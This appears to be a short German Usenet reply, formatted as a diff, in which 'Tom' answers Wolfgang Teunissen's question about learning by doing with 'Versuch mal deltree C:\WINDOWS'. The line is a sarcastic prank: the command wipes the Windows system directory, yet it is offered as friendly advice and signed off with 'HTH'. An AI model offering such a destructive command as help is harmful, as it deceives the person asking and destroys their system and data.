@@ -1,0 +1,11 @@
+Und so sprach Wolfgang Teunissen:
+
+
+Learning by doing? Versuch mal
+
+deltree C:\WINDOWS
+
+HTH,
+Tom.
+-- 
+Remember the... the... uhh.....
